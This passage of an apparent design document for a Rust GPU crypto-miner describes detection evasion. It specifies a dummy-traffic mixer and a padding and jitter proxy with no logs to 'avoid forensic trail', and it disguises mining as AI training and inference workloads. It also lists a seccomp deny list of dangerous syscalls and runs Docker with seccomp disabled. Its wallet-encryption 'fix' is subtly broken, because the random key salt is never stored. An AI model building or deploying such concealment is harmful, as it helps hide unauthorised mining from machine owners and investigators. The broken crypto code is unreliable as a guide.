    min_packet_size: usize,

    /// Jitter range (milliseconds)
    jitter_range: Range<u64>,

    /// Enable padding
    enabled: bool,
}

impl NetworkTrafficMixer {
    pub fn new(config: MixerConfig) -> Self {
        Self {
            dummy_hosts: config.dummy_hosts,
            padding_config: config.padding,
            client: reqwest::Client::builder()
                .timeout(Duration::from_secs(5))
                .build()
                .unwrap(),
            task_handle: None,
            rng: thread_rng(),
        }
    }

    /// Start background dummy traffic task
    pub async fn start(&mut self) -> Result<()> {
        let hosts = self.dummy_hosts.clone();
        let client = self.client.clone();

        let handle = tokio::spawn(async move {
            Self::dummy_traffic_loop(hosts, client).await;
        });

        self.task_handle = Some(handle);

        info!("Network traffic mixer started");
        Ok(())
    }

    pub async fn stop(&mut self) -> Result<()> {
        if let Some(handle) = self.task_handle.take() {
            handle.abort();
        }

        info!("Network traffic mixer stopped");
        Ok(())
    }

    /// Add padding tới Stratum message
    pub fn add_padding(&mut self, message: &[u8]) -> Vec<u8> {
        if !self.padding_config.enabled {
            return message.to_vec();
        }

        let current_size = message.len();
        let target_size = self.padding_config.min_packet_size;

        if current_size >= target_size {
            return message.to_vec();
        }

        let padding_size = target_size - current_size;
        let mut padded = message.to_vec();

        // Add random padding bytes
        let padding: Vec<u8> = (0..padding_size)
            .map(|_| self.rng.gen())
            .collect();

        padded.extend(padding);

        debug!(
            original_size = current_size,
            padded_size = padded.len(),
            "Added padding to message"
        );

        padded
    }

    /// Add jitter delay
    pub async fn add_jitter(&mut self) {
        let jitter_ms = self.rng.gen_range(self.padding_config.jitter_range.clone());
        tokio::time::sleep(Duration::from_millis(jitter_ms)).await;
    }

    async fn dummy_traffic_loop(hosts: Vec<String>, client: reqwest::Client) {
        let mut rng = thread_rng();

        loop {
            // Random interval between requests (30-120s)
            let interval_secs = rng.gen_range(30..120);
            tokio::time::sleep(Duration::from_secs(interval_secs)).await;

            // Pick random host
            if let Some(host) = hosts.choose(&mut rng) {
                match client.get(host).send().await {
                    Ok(response) => {
                        debug!(
                            host = host,
                            status = response.status().as_u16(),
                            "Sent dummy HTTP request"
                        );
                    }
                    Err(e) => {
                        warn!(host = host, error = %e, "Dummy request failed");
                    }
                }
            }
        }
    }
}

#[derive(Clone)]
pub struct MixerConfig {
    pub dummy_hosts: Vec<String>,
    pub padding: PaddingConfig,
}

impl Default for MixerConfig {
    fn default() -> Self {
        Self {
            dummy_hosts: vec![
                "https://www.google.com".to_string(),
                "https://api.github.com".to_string(),
                "https://aws.amazon.com".to_string(),
            ],
            padding: PaddingConfig {
                min_packet_size: 1024,
                jitter_range: 50..200,
                enabled: true,
            },
        }
    }
}
```

**Testing**:
```rust
#[tokio::test]
async fn test_padding() {
    let mut mixer = NetworkTrafficMixer::new(MixerConfig::default());

    let message = b"short message";
    let padded = mixer.add_padding(message);

    assert!(padded.len() >= 1024);
    assert_eq!(&padded[..message.len()], message);
}

#[tokio::test]
async fn test_dummy_traffic() {
    let mut mixer = NetworkTrafficMixer::new(MixerConfig::default());
    mixer.start().await.unwrap();

    // Wait for dummy requests
    tokio::time::sleep(Duration::from_secs(5)).await;

    mixer.stop().await.unwrap();
}
```

**Estimated Effort**: 8 developer-hours

---

## 3. Network Traffic Mixer Enhancement

**Requirements**: Route traffic qua internal proxy, add padding và jitter.

### 3.1 Proxy Router Architecture

```rust
/// Proxy router - Route Stratum traffic qua HTTPS proxy
///
/// Design:
/// - Local proxy server (avoid external MITM)
/// - TLS between proxy → pool (preserve Stratum security)
/// - No proxy logs (avoid forensic trail)
pub struct ProxyRouter {
    /// Proxy URL (http://localhost:8888)
    proxy_url: Url,

    /// HTTP client với proxy configured
    client: reqwest::Client,

    /// Configuration
    config: ProxyConfig,
}

#[derive(Clone)]
pub struct ProxyConfig {
    /// Proxy server URL
    pub proxy_url: String,

    /// Enable TLS verification
    pub verify_tls: bool,

    /// Timeout (seconds)
    pub timeout_secs: u64,
}

impl ProxyRouter {
    pub fn new(config: ProxyConfig) -> Result<Self> {
        let proxy_url = Url::parse(&config.proxy_url)?;

        // Build client với proxy
        let proxy = reqwest::Proxy::all(&config.proxy_url)?;

        let client = reqwest::Client::builder()
            .proxy(proxy)
            .danger_accept_invalid_certs(!config.verify_tls)
            .timeout(Duration::from_secs(config.timeout_secs))
            .build()?;

        Ok(Self {
            proxy_url,
            client,
            config,
        })
    }

    /// Route Stratum traffic qua proxy
    ///
    /// Process:
    /// 1. Pad payload to fixed size (e.g., 4KB blocks)
    /// 2. Add random jitter delay (50-200ms)
    /// 3. Send via HTTPS tunnel to proxy
    /// 4. Proxy forwards to actual pool
    pub async fn route(&self, destination: &str, payload: &[u8]) -> Result<Vec<u8>> {
        // Step 1: Pad payload
        let padded = Self::pad_to_block_size(payload, 4096);

        // Step 2: Add jitter
        let jitter_ms = thread_rng().gen_range(50..200);
        tokio::time::sleep(Duration::from_millis(jitter_ms)).await;

        // Step 3: Send via proxy
        let response = self.client
            .post(&format!("{}/forward", self.proxy_url))
            .header("X-Destination", destination)
            .body(padded)
            .send()
            .await?;

        if !response.status().is_success() {
            anyhow::bail!("Proxy returned error: {}", response.status());
        }

        // Step 4: Extract response
        let response_bytes = response.bytes().await?;

        Ok(response_bytes.to_vec())
    }

    /// Pad payload to fixed block size
    fn pad_to_block_size(payload: &[u8], block_size: usize) -> Vec<u8> {
        let mut padded = payload.to_vec();

        if padded.len() >= block_size {
            return padded;
        }

        let padding_size = block_size - padded.len();
        padded.extend(vec![0u8; padding_size]);

        padded
    }
}
```

### 3.2 Local Proxy Server (Simple Implementation)

**Note**: Proxy server chạy locally, không cần external service.

```rust
/// Simple local proxy server
///
/// Design:
/// - HTTP server lắng nghe localhost:8888
/// - Forward requests tới destination header
/// - No logging (forensic safety)
pub struct LocalProxyServer {
    port: u16,
    shutdown_tx: Option<tokio::sync::oneshot::Sender<()>>,
}

impl LocalProxyServer {
    pub fn new(port: u16) -> Self {
        Self {
            port,
            shutdown_tx: None,
        }
    }

    pub async fn start(&mut self) -> Result<()> {
        let (shutdown_tx, shutdown_rx) = tokio::sync::oneshot::channel();

        let port = self.port;

        tokio::spawn(async move {
            Self::run_server(port, shutdown_rx).await;
        });

        self.shutdown_tx = Some(shutdown_tx);

        info!(port = port, "Proxy server started");
        Ok(())
    }

    pub async fn stop(&mut self) -> Result<()> {
        if let Some(tx) = self.shutdown_tx.take() {
            let _ = tx.send(());
        }

        info!("Proxy server stopped");
        Ok(())
    }

    async fn run_server(port: u16, mut shutdown_rx: tokio::sync::oneshot::Receiver<()>) {
        use warp::Filter;

        let forward = warp::post()
            .and(warp::path("forward"))
            .and(warp::header::<String>("X-Destination"))
            .and(warp::body::bytes())
            .and_then(Self::handle_forward);

        let (_, server) = warp::serve(forward)
            .bind_with_graceful_shutdown(([127, 0, 0, 1], port), async move {
                shutdown_rx.await.ok();
            });

        server.await;
    }

    async fn handle_forward(
        destination: String,
        body: bytes::Bytes,
    ) -> Result<impl warp::Reply, warp::Rejection> {
        // Forward request tới destination
        let client = reqwest::Client::new();

        let response = client
            .post(&destination)
            .body(body.to_vec())
            .send()
            .await
            .map_err(|_| warp::reject::not_found())?;

        let response_bytes = response.bytes().await
            .map_err(|_| warp::reject::not_found())?;

        Ok(warp::reply::with_status(
            response_bytes.to_vec(),
            warp::http::StatusCode::OK,
        ))
    }
}
```

**Dependencies Needed**:
```toml
[dependencies]
warp = "0.3"  # Lightweight HTTP server
reqwest = { version = "0.11", features = ["json"] }
```

**Testing**:
```rust
#[tokio::test]
async fn test_proxy_routing() {
    // Start proxy server
    let mut proxy = LocalProxyServer::new(8888);
    proxy.start().await.unwrap();

    // Create router
    let config = ProxyConfig {
        proxy_url: "http://localhost:8888".to_string(),
        verify_tls: false,
        timeout_secs: 5,
    };

    let router = ProxyRouter::new(config).unwrap();

    // Test routing
    let payload = b"test message";
    let response = router.route("https://httpbin.org/post", payload).await;

    assert!(response.is_ok());

    // Stop proxy
    proxy.stop().await.unwrap();
}
```

**Estimated Effort**: 10 developer-hours

---

## 4. Wallet Encryption Fix

**CRITICAL**: Fix CVE-OPUS-2025-001 (Fixed nonce reuse).

### 4.1 Current Vulnerability

**Vulnerable Code** (crates/security/src/crypto/wallet_protection.rs):

```rust
// Line 53, 68 - CRITICAL BUG
let nonce = Nonce::from_slice(b"unique nonce"); // ❌ SAME nonce every time
```

**Impact**:
- Encrypting multiple wallets với same nonce → **AES-GCM security collapse**
- Attacker có thể XOR ciphertexts để recover plaintext
- Violates NIST SP 800-38D requirements

### 4.2 Secure Fix

**Updated Implementation**:

```rust
use aes_gcm::{
    aead::{Aead, KeyInit, OsRng},
    Aes256Gcm, Nonce,
};
use rand::RngCore;

/// Encrypted wallet structure - MUST include nonce
///
/// Design: Nonce is stored WITH ciphertext (required for decryption).
/// Format: [nonce (12 bytes) | ciphertext | auth_tag (16 bytes)]
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct EncryptedWallet {
    /// Random nonce (96 bits = 12 bytes)
    pub nonce: Vec<u8>,

    /// Encrypted wallet address + auth tag
    pub ciphertext: Vec<u8>,
}

pub struct WalletProtector {
    cipher: Aes256Gcm,
}

impl WalletProtector {
    /// Create new protector từ password
    pub fn new(password: &str) -> Result<Self> {
        // Generate random salt
        let salt = SaltString::generate(&mut OsRng);

        // Derive key using Argon2id
        let argon2 = Argon2::default();
        let password_hash = argon2.hash_password(password.as_bytes(), &salt)?;

        // Extract 32-byte key
        let key_bytes = password_hash.hash
            .ok_or_else(|| anyhow!("No hash generated"))?
            .as_bytes()[..32]
            .to_vec();

        // Create AES-256-GCM cipher
        let key = aes_gcm::Key::<Aes256Gcm>::from_slice(&key_bytes);
        let cipher = Aes256Gcm::new(key);

        Ok(Self { cipher })
    }

    /// Encrypt wallet address - SECURE VERSION
    ///
    /// CRITICAL FIX: Generate random nonce for EVERY encryption
    pub fn encrypt_wallet(&self, wallet_address: &str) -> Result<EncryptedWallet> {
        // Step 1: Generate cryptographically secure random nonce
        let mut nonce_bytes = [0u8; 12]; // AES-GCM nonce = 96 bits = 12 bytes
        OsRng.fill_bytes(&mut nonce_bytes);
        let nonce = Nonce::from_slice(&nonce_bytes);

        // Step 2: Encrypt wallet address
        let ciphertext = self.cipher
            .encrypt(nonce, wallet_address.as_bytes())
            .map_err(|e| anyhow!("Encryption failed: {}", e))?;

        // Step 3: Return nonce + ciphertext
        Ok(EncryptedWallet {
            nonce: nonce_bytes.to_vec(),
            ciphertext,
        })
    }

    /// Decrypt wallet address - SECURE VERSION
    ///
    /// CRITICAL: Use nonce stored WITH ciphertext
    pub fn decrypt_wallet(&self, encrypted: &EncryptedWallet) -> Result<String> {
        // Step 1: Extract nonce từ encrypted data
        let nonce = Nonce::from_slice(&encrypted.nonce);

        // Step 2: Decrypt using stored nonce
        let plaintext = self.cipher
            .decrypt(nonce, encrypted.ciphertext.as_ref())
            .map_err(|e| anyhow!("Decryption failed: {}", e))?;

        // Step 3: Convert to string
        String::from_utf8(plaintext)
            .map_err(|e| anyhow!("Invalid UTF-8: {}", e))
    }
}
```

### 4.3 Testing Requirements

**Comprehensive Test Suite**:

```rust
#[cfg(test)]
mod tests {
    use super::*;
    use std::collections::HashSet;

    /// CRITICAL TEST: Verify nonces are unique
    #[test]
    fn test_nonce_uniqueness() {
        let protector = WalletProtector::new("test_password").unwrap();
        let wallet_data = "0x742d35Cc6634C0532925a3b844Bc9e7595f0bEb";

        let mut nonces = HashSet::new();

        // Encrypt 1000 times
        for _ in 0..1000 {
            let encrypted = protector.encrypt_wallet(wallet_data).unwrap();

            // CRITICAL: Nonce must be unique
            let nonce_hex = hex::encode(&encrypted.nonce);
            assert!(
                nonces.insert(nonce_hex.clone()),
                "Nonce reused: {}",
                nonce_hex
            );
        }

        assert_eq!(nonces.len(), 1000);
    }

    /// CRITICAL TEST: Verify ciphertexts differ
    #[test]
    fn test_ciphertext_uniqueness() {
        let protector = WalletProtector::new("test_password").unwrap();
        let wallet_data = "0x742d35Cc6634C0532925a3b844Bc9e7595f0bEb";

        let enc1 = protector.encrypt_wallet(wallet_data).unwrap();
        let enc2 = protector.encrypt_wallet(wallet_data).unwrap();

        // CRITICAL: Different nonces → different ciphertexts
        assert_ne!(enc1.nonce, enc2.nonce);
        assert_ne!(enc1.ciphertext, enc2.ciphertext);
    }

    /// Phase 3.3 requirement: 1000 successful decrypts
    #[test]
    fn test_decrypt_1000_times() {
        let protector = WalletProtector::new("test_password").unwrap();
        let wallet_data = "0x742d35Cc6634C0532925a3b844Bc9e7595f0bEb";

        for i in 0..1000 {
            let encrypted = protector.encrypt_wallet(wallet_data).unwrap();
            let decrypted = protector.decrypt_wallet(&encrypted).unwrap();

            assert_eq!(
                decrypted, wallet_data,
                "Decryption failed at iteration {}",
                i
            );
        }
    }

    /// Test nonce format (96 bits = 12 bytes)
    #[test]
    fn test_nonce_format() {
        let protector = WalletProtector::new("test_password").unwrap();
        let encrypted = protector.encrypt_wallet("0xABC").unwrap();

        // AES-GCM nonce MUST be 96 bits (12 bytes)
        assert_eq!(encrypted.nonce.len(), 12);
    }

    /// Test encryption/decryption với different passwords
    #[test]
    fn test_wrong_password_fails() {
        let protector1 = WalletProtector::new("password1").unwrap();
        let protector2 = WalletProtector::new("password2").unwrap();

        let encrypted = protector1.encrypt_wallet("0xABC").unwrap();

        // Decryption với wrong password MUST fail
        let result = protector2.decrypt_wallet(&encrypted);
        assert!(result.is_err());
    }
}
```

### 4.4 Migration Strategy

**For Existing Encrypted Wallets** (if any):

```rust
/// Migration tool: Re-encrypt old wallets với new secure method
pub fn migrate_old_wallets(
    old_encrypted: &[u8],
    password: &str,
) -> Result<EncryptedWallet> {
    // Decrypt using OLD method (fixed nonce)
    let old_nonce = Nonce::from_slice(b"unique nonce");
    let cipher = /* ... initialize cipher ... */;

    let plaintext = cipher.decrypt(old_nonce, old_encrypted)
        .map_err(|e| anyhow!("Failed to decrypt old wallet: {}", e))?;

    // Re-encrypt using NEW method (random nonce)
    let protector = WalletProtector::new(password)?;
    let wallet_address = String::from_utf8(plaintext)?;

    protector.encrypt_wallet(&wallet_address)
}
```

**Estimated Effort**: 3 developer-hours (fix + tests)

---

## 5. Seccomp Profiles

**Requirement**: Strict syscall filtering cho production environment.

### 5.1 Design Overview

**Seccomp-BPF** (Secure Computing - Berkeley Packet Filter): Linux kernel feature để whitelist syscalls.

**Design Goals**:
1. **Block dangerous syscalls**: `execve`, `ptrace`, `kexec_load`, `mount`
2. **Allow essential syscalls**: I/O, memory, networking, GPU, threading
3. **Testing**: Verify blocking với automated tests

```rust
use libseccomp::*;

/// Seccomp profile enum
#[derive(Debug, Clone, Copy)]
pub enum SeccompProfile {
    /// Allow all (development only)
    AllowAll,

    /// Whitelist essential syscalls
    Whitelist,

    /// Strict production profile
    Strict,
}

/// Apply seccomp profile
pub fn apply_seccomp_profile(profile: SeccompProfile) -> Result<()> {
    match profile {
        SeccompProfile::AllowAll => {
            debug!("Seccomp AllowAll - no filtering");
            Ok(())
        }

        SeccompProfile::Whitelist => {
            apply_whitelist_profile()
        }

        SeccompProfile::Strict => {
            apply_strict_profile()
        }
    }
}
```

### 5.2 Whitelist Profile Implementation

**Essential Syscalls**:

```rust
fn apply_whitelist_profile() -> Result<()> {
    // Create filter context: default action = KILL
    let mut ctx = ScmpFilterContext::new_filter(ScmpAction::KillProcess)
        .map_err(|e| anyhow!("Failed to create seccomp context: {}", e))?;

    // Whitelist essential syscalls
    let allowed_syscalls = get_mining_whitelist();

    for syscall_name in allowed_syscalls {
        let syscall = ScmpSyscall::from_name(syscall_name)
            .map_err(|e| anyhow!("Unknown syscall: {}", syscall_name))?;

        ctx.add_rule(ScmpAction::Allow, syscall)
            .map_err(|e| anyhow!("Failed to add rule for {}: {}", syscall_name, e))?;
    }

    // Load filter into kernel
    ctx.load()
        .map_err(|e| anyhow!("Failed to load seccomp filter: {}", e))?;

    info!("Seccomp whitelist profile applied");
    Ok(())
}

/// Get syscall whitelist cho mining operations
fn get_mining_whitelist() -> Vec<&'static str> {
    vec![
        // I/O operations
        "read",
        "write",
        "open",
        "openat",
        "close",
        "lseek",

        // Memory management
        "mmap",
        "munmap",
        "mprotect",
        "brk",

        // Networking (Stratum)
        "socket",
        "connect",
        "bind",
        "listen",
        "accept",
        "sendto",
        "recvfrom",
        "setsockopt",
        "getsockopt",

        // GPU communication (CUDA)
        "ioctl",  // CRITICAL for NVIDIA driver

        // Threading
        "futex",
        "clone",
        "clone3",
        "set_robust_list",

        // Process management
        "getpid",
        "gettid",
        "exit",
        "exit_group",

        // Time
        "clock_gettime",
        "gettimeofday",

        // File stat
        "stat",
        "fstat",
        "lstat",
        "statx",

        // Signals
        "rt_sigaction",
        "rt_sigprocmask",
        "rt_sigreturn",

        // Others
        "getrandom",
        "sysinfo",
        "uname",
    ]
}
```

### 5.3 Strict Profile Implementation

**Production Hardening**:

```rust
fn apply_strict_profile() -> Result<()> {
    // Create filter: default = KILL
    let mut ctx = ScmpFilterContext::new_filter(ScmpAction::KillProcess)?;

    // Whitelist ONLY critical syscalls
    let strict_whitelist = get_strict_whitelist();

    for syscall_name in strict_whitelist {
        let syscall = ScmpSyscall::from_name(syscall_name)?;
        ctx.add_rule(ScmpAction::Allow, syscall)?;
    }

    // Explicitly block dangerous syscalls (defense-in-depth)
    let blocked_syscalls = vec![
        "execve",      // Execute binaries
        "execveat",
        "ptrace",      // Debug other processes
        "kexec_load",  // Load new kernel
        "kexec_file_load",
        "mount",       // Modify filesystem
        "umount",
        "umount2",
        "pivot_root",
        "setuid",      // Change UID
        "setgid",
        "setreuid",
        "setregid",
    ];

    for syscall_name in blocked_syscalls {
        if let Ok(syscall) = ScmpSyscall::from_name(syscall_name) {
            ctx.add_rule(ScmpAction::KillProcess, syscall)?;
        }
    }

    ctx.load()?;

    info!("Seccomp strict profile applied");
    Ok(())
}

fn get_strict_whitelist() -> Vec<&'static str> {
    vec![
        // Minimal I/O
        "read",
        "write",
        "close",

        // Minimal memory
        "mmap",
        "munmap",

        // Networking (Stratum only)
        "socket",
        "connect",
        "sendto",
        "recvfrom",

        // GPU (CRITICAL)
        "ioctl",

        // Minimal threading
        "futex",
        "clone",

        // Exit
        "exit",
        "exit_group",
    ]
}
```

### 5.4 Testing

**Automated Test Suite**:

```rust
#[cfg(test)]
mod tests {
    use super::*;
    use std::process::Command;

    #[test]
    #[should_panic]
    fn test_seccomp_blocks_execve() {
        // Apply strict profile
        apply_strict_profile().unwrap();

        // Attempt blocked syscall (should kill process)
        Command::new("/bin/sh")
            .arg("-c")
            .arg("echo test")
            .spawn()
            .unwrap();

        // Should never reach here
        panic!("Seccomp failed to block execve!");
    }

    #[test]
    fn test_seccomp_allows_read() {
        apply_whitelist_profile().unwrap();

        // Read should work
        let mut buffer = [0u8; 10];
        let _ = std::io::stdin().read(&mut buffer);

        // No panic = success
    }

    #[test]
    fn test_seccomp_allows_ioctl() {
        apply_whitelist_profile().unwrap();

        // ioctl should work (needed for GPU)
        // (Cannot test without actual GPU, but verify no crash)
    }
}
```

**Manual Testing**:

```bash
# Build với seccomp enabled
cargo build --release

# Run và verify syscalls
strace -e trace=\!futex ./target/release/mining-cli start

# Should show only whitelisted syscalls
```

**Estimated Effort**: 12 developer-hours

---

## 6. Namespace Isolation

**Requirement**: User, network, và mount namespace isolation.

### 6.1 Design Overview

**Linux Namespaces**: Kernel feature để isolate process resources.

**Namespace Types**:
1. **User NS** (`CLONE_NEWUSER`): UID/GID mapping
2. **Network NS** (`CLONE_NEWNET`): Network stack isolation
3. **Mount NS** (`CLONE_NEWNS`): Filesystem isolation

```rust
use nix::sched::{unshare, CloneFlags};
use nix::unistd::{Uid, Gid};
use std::fs;

/// Namespace isolation configuration
#[derive(Debug, Clone)]
pub struct NamespaceConfig {
    pub user_ns: bool,
    pub net_ns: bool,
    pub mount_ns: bool,
}

/// Apply namespace isolation
pub fn isolate_namespaces(config: NamespaceConfig) -> Result<()> {
    if config.user_ns {
        isolate_user_namespace()?;
    }

    if config.net_ns {
        isolate_network_namespace()?;
    }

    if config.mount_ns {
        isolate_mount_namespace()?;
    }

    info!("Namespace isolation applied");
    Ok(())
}
```

### 6.2 User Namespace Implementation

```rust
/// Isolate user namespace - Map current UID to root in namespace
fn isolate_user_namespace() -> Result<()> {
    debug!("Isolating user namespace...");

    // Step 1: Unshare user namespace
    unshare(CloneFlags::CLONE_NEWUSER)
        .map_err(|e| anyhow!("Failed to unshare user namespace: {}", e))?;

    // Step 2: Map current UID → 0 (root in namespace)
    let uid = Uid::current();
    let gid = Gid::current();

    fs::write("/proc/self/uid_map", format!("0 {} 1", uid.as_raw()))
        .map_err(|e| anyhow!("Failed to write uid_map: {}", e))?;

    // Step 3: Disable setgroups (required for gid_map)
    fs::write("/proc/self/setgroups", "deny")
        .map_err(|e| anyhow!("Failed to write setgroups: {}", e))?;

    fs::write("/proc/self/gid_map", format!("0 {} 1", gid.as_raw()))
        .map_err(|e| anyhow!("Failed to write gid_map: {}", e))?;

    info!("User namespace isolated (UID {} → 0)", uid.as_raw());
    Ok(())
}
```

### 6.3 Network Namespace Implementation

```rust
/// Isolate network namespace - Create veth pair
fn isolate_network_namespace() -> Result<()> {
    debug!("Isolating network namespace...");

    // Step 1: Unshare network namespace
    unshare(CloneFlags::CLONE_NEWNET)
        .map_err(|e| anyhow!("Failed to unshare network namespace: {}", e))?;

    // Step 2: Create veth pair (requires CAP_NET_ADMIN)
    // veth0 (in namespace) <-> veth1 (in host)
    // NOTE: This requires elevated privileges or external setup

    warn!("Network namespace isolated (veth setup required by external script)");
    Ok(())
}
```

**External Setup Script** (veth.sh):

```bash
#!/bin/bash
# Setup veth pair for network namespace

# Create veth pair
ip link add veth0 type veth peer name veth1

# Move veth0 to namespace
ip link set veth0 netns <PID>

# Configure veth1 in host
ip addr add 10.200.1.1/24 dev veth1
ip link set veth1 up

# Configure veth0 in namespace (run inside namespace)
nsenter -t <PID> -n ip addr add 10.200.1.2/24 dev veth0
nsenter -t <PID> -n ip link set veth0 up
nsenter -t <PID> -n ip route add default via 10.200.1.1
```

### 6.4 Mount Namespace Implementation

```rust
use nix::mount::{mount, MsFlags};

/// Isolate mount namespace - Read-only root, writable /tmp
fn isolate_mount_namespace() -> Result<()> {
    debug!("Isolating mount namespace...");

    // Step 1: Unshare mount namespace
    unshare(CloneFlags::CLONE_NEWNS)
        .map_err(|e| anyhow!("Failed to unshare mount namespace: {}", e))?;

    // Step 2: Remount root as read-only
    mount(
        None::<&str>,
        "/",
        None::<&str>,
        MsFlags::MS_REMOUNT | MsFlags::MS_RDONLY | MsFlags::MS_BIND,
        None::<&str>,
    )
    .map_err(|e| anyhow!("Failed to remount root as read-only: {}", e))?;

    // Step 3: Mount /tmp as tmpfs (writable)
    mount(
        Some("tmpfs"),
        "/tmp",
        Some("tmpfs"),
        MsFlags::MS_NOEXEC | MsFlags::MS_NOSUID,
        None::<&str>,
    )
    .map_err(|e| anyhow!("Failed to mount /tmp: {}", e))?;

    info!("Mount namespace isolated (root=ro, tmp=rw)");
    Ok(())
}
```

### 6.5 Kernel Requirements Check

```rust
/// Check kernel support for namespaces
pub fn check_namespace_support() -> Result<NamespaceCapabilities> {
    let user_ns = std::path::Path::new("/proc/self/ns/user").exists();
    let net_ns = std::path::Path::new("/proc/self/ns/net").exists();
    let mount_ns = std::path::Path::new("/proc/self/ns/mnt").exists();

    let caps = NamespaceCapabilities {
        user_ns,
        net_ns,
        mount_ns,
    };

    if !caps.user_ns {
        warn!("User namespace not supported (kernel <3.8)");
    }

    Ok(caps)
}

#[derive(Debug)]
pub struct NamespaceCapabilities {
    pub user_ns: bool,
    pub net_ns: bool,
    pub mount_ns: bool,
}
```

### 6.6 Docker GPU Compatibility

**Dockerfile Example**:

```dockerfile
FROM nvidia/cuda:12.0-runtime-ubuntu22.04

# Install dependencies
RUN apt-get update && apt-get install -y \
    libseccomp-dev \
    iproute2 \
    && rm -rf /var/lib/apt/lists/*

# Copy binary
COPY target/release/mining-cli /usr/local/bin/

# Run với GPU và capabilities
# docker run --gpus all --cap-add=SYS_ADMIN mining-cli
```

**Run Command**:

```bash
docker run \
  --gpus all \
  --cap-add=SYS_ADMIN \
  --security-opt seccomp=unconfined \
  mining-image
```

### 6.7 Testing

```rust
#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_user_namespace_isolation() {
        let config = NamespaceConfig {
            user_ns: true,
            net_ns: false,
            mount_ns: false,
        };

        isolate_namespaces(config).unwrap();

        // Verify UID is 0 in namespace
        assert_eq!(Uid::current().as_raw(), 0);
    }

    #[test]
    fn test_mount_namespace_readonly_root() {
        let config = NamespaceConfig {
            user_ns: false,
            net_ns: false,
            mount_ns: true,
        };

        isolate_namespaces(config).unwrap();

        // Try to write to root (should fail)
        let result = fs::write("/test_file", "test");
        assert!(result.is_err());
    }
}
```

**Estimated Effort**: 14 developer-hours

---

## 7. Integration Architecture

**Component Interaction Diagram**:

```
┌─────────────────────────────────────────────────────────────────┐
│                  Mining Core Process                            │
│                                                                 │
│  ┌───────────────────────────────────────────────────────────┐ │
│  │  Phase 1: Startup                                        │ │
│  │  1. Check kernel capabilities (namespace support)        │ │
│  │  2. Apply namespace isolation (user, net, mount)         │ │
│  │  3. Apply seccomp filter (whitelist/strict)              │ │
│  │  4. Drop privileges (if needed)                          │ │
│  └───────────────────────────────────────────────────────────┘ │
│                                                                 │
│  ┌───────────────────────────────────────────────────────────┐ │
│  │  Phase 2: Initialization                                 │ │
│  │  1. Load wallet (decrypt using WalletProtector)          │ │
│  │  2. Start ProfileManager (AI training/inference/etc.)    │ │
│  │  3. Start ProxyRouter (if enabled)                       │ │
│  │  4. Initialize GPU Manager với smoother                  │ │
│  └───────────────────────────────────────────────────────────┘ │
│                                                                 │
│  ┌──────────────┐          ┌────────────────────────────────┐  │
│  │ Background   │          │  Main Mining Loop             │  │
│  │ Tasks        │          │                                │  │
│  │              │          │  1. Get work từ Stratum       │  │
│  │ - Stealth    │──┬──────│  2. GPU Usage Smoother active │  │
│  │   Profiles   │  │       │  3. Launch CUDA kernels       │  │
│  │ - Memory     │  │       │  4. Check results             │  │
│  │   Faker      │  │       │  5. Submit shares (via proxy) │  │
│  │ - Network    │  │       │  6. Update statistics         │  │
│  │   Mixer      │  └──────│                                │  │
│  └──────────────┘          └────────────────────────────────┘  │
│                                                                 │
│  ┌───────────────────────────────────────────────────────────┐ │
│  │  Phase 3: Shutdown                                       │ │
│  │  1. Stop stealth profiles                                │ │
│  │  2. Encrypt wallet (save using WalletProtector)          │ │
│  │  3. Cleanup GPU memory                                   │ │
│  │  4. Exit cleanly                                         │ │
│  └───────────────────────────────────────────────────────────┘ │
└─────────────────────────────────────────────────────────────────┘
```

### 7.1 Lifecycle Management

**Main Function** (mining-cli/src/commands/start.rs):

```rust
use stealth_layer::{ProfileManager, ProfileManagerConfig};
use security::{
    apply_seccomp_profile, SeccompProfile,
    isolate_namespaces, NamespaceConfig,
    WalletProtector, EncryptedWallet,
};
use mining_core::GpuManager;

pub async fn start_mining(config: MiningConfig) -> Result<()> {
    info!("Starting GPU mining system...");

    // ========== PHASE 1: STARTUP ==========

    // Check kernel capabilities
    let ns_caps = security::check_namespace_support()?;
    info!("Kernel capabilities: {:?}", ns_caps);

    // Apply namespace isolation
    if config.security.enable_namespaces {
        let ns_config = NamespaceConfig {
            user_ns: config.security.user_namespace,
            net_ns: config.security.network_namespace,
            mount_ns: config.security.mount_namespace,
        };

        isolate_namespaces(ns_config)?;
        info!("Namespace isolation applied");
    }

    // Apply seccomp filter
    if config.security.enable_seccomp {
        apply_seccomp_profile(config.security.seccomp_profile)?;
        info!("Seccomp profile applied: {:?}", config.security.seccomp_profile);
    }

    // ========== PHASE 2: INITIALIZATION ==========

    // Load wallet
    let wallet_protector = WalletProtector::new(&config.wallet.password)?;
    let encrypted_wallet = load_encrypted_wallet(&config.wallet.path)?;
    let wallet_address = wallet_protector.decrypt_wallet(&encrypted_wallet)?;
    info!("Wallet decrypted: {}...", &wallet_address[..10]);

    // Start stealth profiles
    let mut profile_manager = ProfileManager::new(config.stealth.profile_config.clone());

    // Register profiles
    profile_manager.register(Box::new(AiTrainingWrapper::new(config.stealth.ai_training)));
    profile_manager.register(Box::new(AiInferenceWrapper::new(config.stealth.ai_inference)));

    profile_manager.start_all().await?;
    info!("Stealth profiles started");

    // Start proxy router (if enabled)
    let mut proxy_router = if config.network.enable_proxy {
        let mut router = ProxyRouter::new(config.network.proxy_config)?;
        router.start().await?;
        Some(router)
    } else {
        None
    };

    // Initialize GPU Manager với smoother
    let mut gpu_manager = GpuManager::new(config.mining.gpu_config)?;
    gpu_manager.initialize_smoothers()?;
    info!("GPU manager initialized với smoothers");

    // ========== PHASE 3: MAIN LOOP ==========

    info!("Entering mining loop...");

    loop {
        // Get work từ Stratum
        let work = get_work_from_pool().await?;

        // GPU usage smoother active (automatic)
        let smoothed_usage = gpu_manager.get_smoothed_usage(0)?;
        debug!("Smoothed GPU usage: {:.2}%", smoothed_usage * 100.0);

        // Launch CUDA kernels
        let result = gpu_manager.mine_block(&work).await?;

        // Submit share (via proxy if enabled)
        if let Some(share) = result {
            if let Some(router) = &proxy_router {
                router.submit_share(&share).await?;
            } else {
                submit_share_direct(&share).await?;
            }
        }

        // Check shutdown signal
        if shutdown_requested() {
            break;
        }
    }

    // ========== PHASE 4: SHUTDOWN ==========

    info!("Shutting down...");

    // Stop stealth profiles
    profile_manager.stop_all().await?;

    // Encrypt wallet
    let encrypted = wallet_protector.encrypt_wallet(&wallet_address)?;
    save_encrypted_wallet(&config.wallet.path, &encrypted)?;
    info!("Wallet encrypted and saved");

    // Cleanup
    gpu_manager.cleanup()?;

    info!("Mining system stopped");
    Ok(())
}
```
